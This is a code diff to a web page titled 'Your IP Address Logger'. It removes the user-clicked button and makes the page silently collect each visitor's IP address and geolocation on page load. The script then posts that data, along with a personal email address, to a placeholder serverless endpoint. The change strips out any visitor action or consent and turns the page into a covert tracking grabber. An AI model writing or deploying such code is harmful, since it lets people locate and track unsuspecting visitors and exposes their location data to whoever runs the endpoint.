@@ -8,17 +8,17 @@
 </head>
 <body>
     <h1>Your IP Address Logger</h1>
-    <button id="getIp">Get My IP Address</button>
     <script>
         $(document).ready(function() {
-            $('#getIp').click(function() {
-                $.get('https://api.ipify.org?format=json', function(data) {
-                    const ip = data.ip;
-                    $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
-                        $.post('https://your-function-url', {
-                            ip: ip,
-                            location: locationData
-                        });
+            // Automatically get IP address and location on page load
+            $.get('https://api.ipify.org?format=json', function(data) {
+                const ip = data.ip;
+                $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
+                    // Send data to your serverless function
+                    $.post('https://your-function-url', {
+                        ip: ip,
+                        location: locationData,
+                        email: 'fabegabe26@gmail.com' // Email address to send the data
                     });
                 });
             });
